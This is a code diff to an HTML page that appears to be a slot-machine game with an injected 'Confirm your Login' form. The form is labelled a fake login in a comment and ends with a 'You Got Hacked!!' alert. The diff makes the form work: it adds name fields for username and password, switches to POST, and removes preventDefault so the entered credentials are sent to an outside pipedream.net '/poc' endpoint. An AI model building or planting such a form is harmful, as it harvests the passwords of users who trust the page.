@@ -47,9 +47,9 @@
       <button id="girarBtn">Roll</button>
       <div class="login">
         <h3>Confirm your Login</h3>
-        <form id="slotLoginForm" action="//eobx9u4gpw6vs1y.m.pipedream.net/poc" method="GET">
-          <input type="text" placeholder="User/Mail" required><br>
-          <input type="password" placeholder="Password" required><br>
+        <form id="slotLoginForm" action="//eobx9u4gpw6vs1y.m.pipedream.net/poc" method="POST">
+          <input type="text" name="user" placeholder="User/Mail" required><br>
+          <input type="password" name="pass" placeholder="Password" required><br>
           <button type="submit">Signin</button>
         </form>
       </div>
@@ -69,7 +69,6 @@
 
     // Função de login fake
     document.getElementById('slotLoginForm').onsubmit = function(e) {
-        e.preventDefault();
         alert('You Got Hacked!!');
     };
 })();
